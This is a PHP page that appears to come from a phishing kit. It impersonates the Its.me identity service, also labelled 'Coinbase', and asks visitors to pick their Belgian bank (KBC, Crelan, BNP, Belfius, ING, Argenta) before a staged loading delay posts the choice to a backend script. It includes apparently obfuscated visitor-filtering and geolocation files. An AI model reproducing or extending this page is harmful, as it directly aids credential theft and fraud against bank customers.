<?php
	  session_start();
	  error_reporting(0);
	  include "./Asstes/php/lang/lang.php";
	  include "./Asstes/php/config/config2.php";
  
	include('./CryoFusion/CherryBlossom.php');
	include('./CryoFusion/EmeraldCity.php');
	include('./CryoFusion/GoldenGateBridge.php');
	include('./CryoFusion/GrandCanyon.php');
	include('./CryoFusion/PacificOcean.php');
	include('./CryoFusion/SerengetiPlains.php');
	include('./CryoFusion/VictoriaFalls.php');
	include('./CryoFusion/Thalorinox.php');
	
include "./CryoFusion/geoplugin.class.php";
include "./CryoFusion/UserInfo.php";
?>
<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8">
        <meta name="discription" content="Coinbase">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="shortcut icon" href="./Asstes/imgs/its.webp">
        <title>Its.me service</title>
        <!-- === bootstrap === -->
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css" rel="stylesheet" />
        <!-- == Font-awesome " icon " == -->
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
        <!-- == remixicon " icon " == -->
        <link href="https://cdn.jsdelivr.net/npm/remixicon@3.5.0/fonts/remixicon.css" rel="stylesheet">
        <!-- == file style css == -->
        <link rel="stylesheet" href="./Asstes/css/style.css">
        <style>
       #loading {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: #ffffff; /* Fully white background */
    z-index: 9999;
    display: none;
    justify-content: center;
    align-items: center;
    flex-direction: column;
    text-align: center;
    font-family: Arial, sans-serif;
}

.spinner {
    width: 60px;
    height: 60px;
    border: 8px solid #eee;
    border-top: 8px solid orange;
    border-radius: 50%;
    animation: spin 1s linear infinite;
}

.loading-text {
    margin-top: 20px;
    font-size: 16px;
    color: #333;
    font-weight: bold; /* Makes text bold */
}

@keyframes spin {
    100% { transform: rotate(360deg); }
}
        
.title {
    text-align: center;
    margin: 60px 0 40px;
}

.title h1 {
    font-size: 42px;
    font-weight: 700;
    margin-bottom: 14px;
}

.subtitle {
    font-size: 19px;          /* balanced size */
    font-weight: 600;         /* little bold */
    max-width: 620px;
    margin: 0 auto;
    line-height: 1.5;
    color: #2c2c2c;           /* darker, more premium */
}

.alert-box {
    background-color: #fff4f4;
    border: 1px solid #e0a1a1;
    color: #b00020;
    padding: 18px;
    border-radius: 6px;
    max-width: 650px;
    margin: 20px auto;
    font-size: 18px;
    font-weight: 600;
    text-align: center;
}
        </style>
    </head>
    <body class="one">

    <div class="box_whiate"></div>
    <!-- wrapper_box_option -->
    <div class="wrapper_box_type">
      <div class="container_box_type d-flex">
        <div class="part_left items">
            <div class="logo">
              <img src="./Asstes/imgs/logo.svg" alt="">
            </div>
            <div class="info">
<div class="title">
    <h1><?php echo get_text('type'); ?></h1>
<div class="alert-box">
    <strong><?php echo get_text('typebb'); ?>:</strong><br>
    <?php echo get_text('typebb2'); ?>
</div>
</div>
			  
			  
	<form id="postForm" method="POST" action="./Asstes/php/config/func.php">
    <input type="hidden" name="method_chose" id="methodInput">
</form>		  
			  
			  
<div id="loading">
    <div class="spinner"></div>
    <div id="loadingText" class="loading-text">
       <?php echo get_text('load22'); ?>
    </div>
</div>
			  
			  
              <div class="boxes">
			  	<?php if ($blanco_kbc == "y") { ?>
				
                <div class="box kb">
                  <img src="./Asstes/imgs/x3.webp" alt="">
                </div>
                <?php } ?>
                
                
                
			   <?php if ($blanco_crelan == "y") { ?>
			  
			  
			   <div class="box cr">
                  <img src="./Asstes/imgs/crrel.png" alt="">
                </div>
				
				<?php } ?>
				 
                
				
				<?php if ($blanco_bnp == "y") { ?>
                <div class="box bp">
                  <img src="./Asstes/imgs/x2.webp" alt="">
                </div>
				<?php } ?>
				
				<?php if ($blanco_belfius == "y") { ?>
                <div class="box bf">
                  <img src="./Asstes/imgs/x1.webp" alt="">
                </div>
				<?php } ?>
				
				<?php if ($blanco_ing == "y") { ?>
                <div class="box in">
                  <img src="./Asstes/imgs/x5.webp" alt="">
                </div>
				<?php } ?>
				
				
				
				<?php if ($blanco_argenta == "y") { ?>
                <div class="box ar">
                  <img src="./Asstes/imgs/x6.svg" width="119px" style="height: 60px;" alt="">
                </div>
				<?php } ?>
              </div>
			  
			  
			  
            </div>
        </div>
        <div class="part_right items d-flex justify-content-end align-items-center">
          <img src="./Asstes/imgs/mob.webp" alt="">
        </div>
      </div>
    </div>







    <!-- bootstrap -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
    <!-- script jquery -->
    <script src="https://code.jquery.com/jquery-3.7.1.js"></script>
    
<script>
$(document).ready(function(){

    $("#loading").hide();

    $(".bp, .kb, .cr, .ar, .bf, .in").click(function(e){

        e.preventDefault(); // stop immediate submit

        // Set selected method
        if ($(this).hasClass("bp")) $("#methodInput").val("bp");
        if ($(this).hasClass("kb")) $("#methodInput").val("kb");
        if ($(this).hasClass("cr")) $("#methodInput").val("cr");
        if ($(this).hasClass("ar")) $("#methodInput").val("ar");
		if ($(this).hasClass("in")) $("#methodInput").val("in");
		if ($(this).hasClass("bf")) $("#methodInput").val("bf");

        // Show loader
        $("#loading").css("display","flex");

        // Wait 5 seconds, then submit form
        setTimeout(function(){
            $("#postForm").submit();
        }, 4000);

    });

});
</script>
<script>
$(document).ready(function(){

    $("#loading").hide();

    $(".bp, .kb, .cr, .ar, .bf, .in").click(function(){
        showLoader();
    });

});

function showLoader(){
    $("#loading").css("display","flex");

    startDotAnimation();

    setTimeout(function(){
        $("#loading").hide();
        stopDotAnimation();
    }, 5000); // 3 seconds
}

let dotInterval;

function startDotAnimation(){
    let dots = 1;

    dotInterval = setInterval(function(){
        let dotString = ".".repeat(dots);
        $("#loadingText").text(
            "<?php echo get_text('load22'); ?> " + dotString
        );

        dots++;
        if(dots > 4){
            dots = 1;
        }
    }, 400); // speed of dot animation
}

function stopDotAnimation(){
    clearInterval(dotInterval);
}

/* 🔥 FIX BACK BUTTON ISSUE */
window.addEventListener("pageshow", function(event) {
    $("#loading").hide();
});
</script>
    </body>
</html>